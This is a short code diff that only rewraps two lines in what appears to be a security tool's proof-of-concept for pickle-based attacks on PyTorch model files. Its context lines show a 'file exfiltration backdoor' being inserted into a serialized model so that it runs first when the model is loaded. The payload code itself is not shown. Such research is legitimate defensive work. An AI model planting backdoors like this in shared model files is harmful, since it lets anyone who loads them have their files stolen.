@@ -92,7 +92,9 @@ def inject_payload(pytorch_model_path: Path, payload: str, output_model_path: Pa
                 pickled = pickle.Pickled.load(pickled_file)
                 log("Inserting file exfiltration backdoor into serialized model")
 
-                pickled.insert_python_exec(PAYLOAD, run_first=True, use_output_as_unpickle_result=False)
+                pickled.insert_python_exec(
+                    PAYLOAD, run_first=True, use_output_as_unpickle_result=False
+                )
                 # Open up the file for writing
                 pickled_file.close()
                 pickled_file = open(pickle_file_path, "wb")
@@ -146,7 +148,9 @@ for file in os.listdir():
 ")"""
 
     exfil_model = wrapper.clone()
-    exfil_model.pickled.insert_python_exec(EXFIL_PAYLOAD, run_first=True, use_output_as_unpickle_result=False)
+    exfil_model.pickled.insert_python_exec(
+        EXFIL_PAYLOAD, run_first=True, use_output_as_unpickle_result=False
+    )
     exfil_model = exfil_model.save(Path("pytorch_exfil_poc.zip"))
     print(f"Created PyTorch exfiltration exploit payload PoC {exfil_model.path.absolute()!s}")
 
